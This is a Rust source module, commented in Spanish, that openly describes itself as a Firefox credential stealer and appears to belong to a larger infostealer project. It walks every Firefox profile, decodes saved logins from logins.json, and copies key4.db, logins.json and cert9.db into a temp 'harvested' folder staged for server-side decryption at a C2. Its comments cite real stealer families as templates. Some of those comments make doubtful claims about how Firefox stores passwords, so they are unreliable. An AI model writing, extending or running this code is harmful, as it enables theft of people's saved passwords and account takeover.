// Stealer para Mozilla Firefox
use crate::stealer::{Credential, StealerError, StealerResult};
use crate::stealer::common::{get_appdata_roaming, file_exists, base64_decode};
use std::path::PathBuf;
use std::fs;
use std::io::Write;

/// Roba credenciales de Firefox
pub fn steal_firefox() -> StealerResult<Vec<Credential>> {
    let appdata = get_appdata_roaming().ok_or(StealerError::BrowserNotFound)?;
    
    // Firefox almacena perfiles en: %APPDATA%\Mozilla\Firefox\Profiles
    let firefox_path = appdata.join(r"Mozilla\Firefox\Profiles");
    
    if !firefox_path.exists() {
        return Err(StealerError::BrowserNotFound);
    }

    let mut all_credentials = Vec::new();

    // Iterar sobre todos los perfiles de Firefox
    if let Ok(entries) = std::fs::read_dir(&firefox_path) {
        for entry in entries.flatten() {
            if entry.path().is_dir() {
                // Intentar extraer credenciales de este perfil
                match extract_firefox_profile(&entry.path()) {
                    Ok(mut creds) => all_credentials.append(&mut creds),
                    Err(_) => continue,  // Ignorar perfiles que fallan
                }
            }
        }
    }

    if all_credentials.is_empty() {
        Err(StealerError::BrowserNotFound)
    } else {
        Ok(all_credentials)
    }
}

/// Extrae credenciales de un perfil específico de Firefox
fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credential>> {
    // ESTRATEGIA FICKER-STEALER:
    // Firefox moderno (133+) cifra credenciales con NSS
    // En lugar de intentar descifrar client-side (complejo, requiere nss3.dll),
    // exfiltramos los archivos RAW al C2 para descifrado server-side
    //
    // Archivos necesarios para descifrado NSS:
    // - key4.db: Contiene la master key cifrada
    // - logins.json: Credenciales (si existe, versiones antiguas)
    // - cert9.db: Certificados NSS (opcional pero útil)
    
    let mut credentials = Vec::new();
    
    // Método 1: Intentar logins.json (Firefox antiguas <133)
    let logins_json = profile_path.join("logins.json");
    if file_exists(&logins_json) {
        if let Ok(content) = std::fs::read_to_string(&logins_json) {
            if let Ok(creds) = parse_firefox_logins(&content, None) {
                if !creds.is_empty() {
                    return Ok(creds);
                }
            }
        }
    }
    
    // Método 2: Firefox moderno - Exfiltrar archivos para descifrado server-side
    // Crear directorio de exfiltración
    let exfil_dir = get_firefox_exfil_dir()?;
    let profile_name = profile_path.file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("unknown");
    let profile_exfil = exfil_dir.join(profile_name);
    
    // Crear directorio del perfil
    fs::create_dir_all(&profile_exfil)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    // Copiar archivos clave
    let mut files_copied = 0;
    
    // key4.db (CRÍTICO - contiene master key)
    if let Ok(_) = copy_file_safe(&profile_path.join("key4.db"), &profile_exfil.join("key4.db")) {
        files_copied += 1;
    }
    
    // logins.json (si existe)
    if let Ok(_) = copy_file_safe(&profile_path.join("logins.json"), &profile_exfil.join("logins.json")) {
        files_copied += 1;
    }
    
    // cert9.db (certificados NSS)
    if let Ok(_) = copy_file_safe(&profile_path.join("cert9.db"), &profile_exfil.join("cert9.db")) {
        files_copied += 1;
    }
    
    // Crear archivo de metadatos
    let metadata = format!(
        "Firefox Profile: {}\nFiles copied: {}\nExfiltration timestamp: {:?}\nNote: Use NSS server-side decrypt\n",
        profile_name,
        files_copied,
        std::time::SystemTime::now()
    );
    
    if let Ok(mut f) = fs::File::create(profile_exfil.join("README.txt")) {
        let _ = f.write_all(metadata.as_bytes());
    }
    
    // Agregar credencial placeholder para indicar que hay datos exfiltrados
    if files_copied > 0 {
        credentials.push(Credential {
            browser: "Firefox".to_string(),
            url: format!("[RAW FILES EXFILTRATED] Profile: {}", profile_name),
            username: format!("{} files copied to harvested/firefox/", files_copied),
            password: "[decrypt server-side with NSS using key4.db]".to_string(),
        });
    }
    
    if credentials.is_empty() {
        Err(StealerError::DatabaseError("No Firefox credentials found".into()))
    } else {
        Ok(credentials)
    }
}

/// Obtiene el directorio de exfiltración de Firefox
fn get_firefox_exfil_dir() -> StealerResult<PathBuf> {
    let temp_dir = std::env::temp_dir();
    let exfil_dir = temp_dir.join("harvested").join("firefox");
    
    fs::create_dir_all(&exfil_dir)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    Ok(exfil_dir)
}

/// Copia un archivo de forma segura (ignora errores de locked files)
fn copy_file_safe(src: &PathBuf, dst: &PathBuf) -> StealerResult<()> {
    if !file_exists(src) {
        return Err(StealerError::IoError("Source file not found".into()));
    }
    
    // Firefox puede tener archivos bloqueados, intentar copiar
    match fs::copy(src, dst) {
        Ok(_) => Ok(()),
        Err(e) => {
            // Si está bloqueado, intentar leer y escribir manualmente
            match fs::read(src) {
                Ok(content) => {
                    fs::write(dst, content)
                        .map_err(|e| StealerError::IoError(e.to_string()))?;
                    Ok(())
                }
                Err(_) => Err(StealerError::IoError(format!("Cannot copy file: {}", e)))
            }
        }
    }
}

/// Parsea logins.json y extrae credenciales
fn parse_firefox_logins(json_content: &str, _master_key: Option<&[u8]>) -> StealerResult<Vec<Credential>> {
    let mut credentials = Vec::new();
    
    // REALIDAD DE FIREFOX (basado en análisis de infostealers modernos):
    // - Por defecto, Firefox USA "username" y "password" (Base64, NO encriptados)
    // - SOLO si el usuario configuró Master Password, usa "encryptedUsername" y "encryptedPassword"
    // - El 99% de usuarios NO tiene Master Password configurada
    // 
    // Estrategia de infostealers reales (Satan, Hannibal, Ficker):
    // 1. Intentan campos en texto plano (username/password)
    // 2. Si fallan, simplemente ignoran (no vale la pena implementar NSS decrypt)
    //
    // Referencias:
    // - Satan-Stealer: Solo roba Chromium passwords, ignora Firefox completamente
    // - FickerStealer: Envía logins.json RAW al C2, el servidor hace decrypt
    // - Hannibal: "Firefox does not encrypt cookies at rest (unless a master password is set)"
    
    if let Some(logins_start) = json_content.find("\"logins\":[") {
        let logins_section = &json_content[logins_start..];
        
        // Buscar cada objeto login
        let mut pos = 0;
        while let Some(entry_start) = logins_section[pos..].find("{") {
            pos += entry_start;
            
            if let Some(entry_end) = logins_section[pos..].find("}") {
                let entry = &logins_section[pos..pos + entry_end + 1];
                
                // Extraer hostname
                let hostname = extract_json_field(entry, "hostname");
                
                // Firefox SIN Master Password: usa campos "username" y "password" (Base64)
                let plain_username = extract_json_field(entry, "username");
                let plain_password = extract_json_field(entry, "password");
                
                if let Some(url) = hostname {
                    if let (Some(user_b64), Some(pass_b64)) = (plain_username, plain_password) {
                        // Decodificar Base64 (Firefox codifica en Base64 pero NO encripta)
                        let username = base64_decode(&user_b64)
                            .ok()
                            .and_then(|bytes| String::from_utf8(bytes).ok())
                            .unwrap_or_else(|| user_b64.clone());  // Si falla decode, usar raw
                        
                        let password = base64_decode(&pass_b64)
                            .ok()
                            .and_then(|bytes| String::from_utf8(bytes).ok())
                            .unwrap_or_else(|| pass_b64.clone());  // Si falla decode, usar raw
                        
                        credentials.push(Credential {
                            browser: "Firefox".to_string(),
                            url,
                            username,
                            password,
                        });
                    }
                }
                
                pos += entry_end + 1;
            } else {
                break;
            }
        }
    }
    
    Ok(credentials)
}

/// Extrae un campo de un objeto JSON simple
fn extract_json_field(json: &str, field: &str) -> Option<String> {
    let pattern = format!("\"{}\":\"", field);
    if let Some(start) = json.find(&pattern) {
        let value_start = start + pattern.len();
        if let Some(end) = json[value_start..].find("\"") {
            return Some(json[value_start..value_start + end].to_string());
        }
    }
    None
}
